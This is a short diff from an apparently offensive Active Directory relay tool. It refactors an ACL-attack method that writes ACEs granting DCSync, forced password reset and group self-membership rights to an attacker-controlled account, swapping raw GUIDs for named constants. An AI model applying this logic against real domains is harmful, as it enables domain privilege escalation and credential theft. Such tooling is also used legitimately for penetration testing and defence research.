@@ -47,7 +47,7 @@ from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
 from dsinternals.system.DateTime import DateTime
 from dsinternals.common.data.hello.KeyCredential import KeyCredential
 
-from powerview.utils.constants import WELL_KNOWN_SIDS
+from powerview.utils.constants import WELL_KNOWN_SIDS, EXTENDED_RIGHTS_NAME_MAP
 
 # This is new from ldap3 v2.5
 try:
@@ -353,10 +353,10 @@ class LDAPAttack(ProtocolAttack):
 
     def aclAttack(self):
         rights = {
-                'dcsync':['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'],
-                'all':['1131f6aa-9c07-11d1-f79f-00c04fc2dcd2','1131f6ad-9c07-11d1-f79f-00c04fc2dcd2','00299570-246d-11d0-a768-00aa006e0529','bf9679c0-0de6-11d0-a285-00aa003049e2'],
-                'resetpassword':['00299570-246d-11d0-a768-00aa006e0529'],
-                'writemembers':['bf9679c0-0de6-11d0-a285-00aa003049e2']
+                'dcsync':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'], EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All']],
+                'all':[EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes'],EXTENDED_RIGHTS_NAME_MAP['DS-Replication-Get-Changes-All'], EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password'], EXTENDED_RIGHTS_NAME_MAP['Self-Membership']],
+                'resetpassword':[EXTENDED_RIGHTS_NAME_MAP['User-Force-Change-Password']],
+                'writemembers':[EXTENDED_RIGHTS_NAME_MAP['Self-Membership']]
             }
 
         # Query for the sid of our user
@@ -389,7 +389,6 @@ class LDAPAttack(ProtocolAttack):
             if self.args.rights.lower() in list(rights.keys()):
                 for guid in rights[self.args.rights]:
                     secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
-                    #secDesc['Dacl']['Data'].append(create_object_ace(guid, usersid))
             else:
                 LOG.error(f'{self.args.rights} right is not valid')
                 return
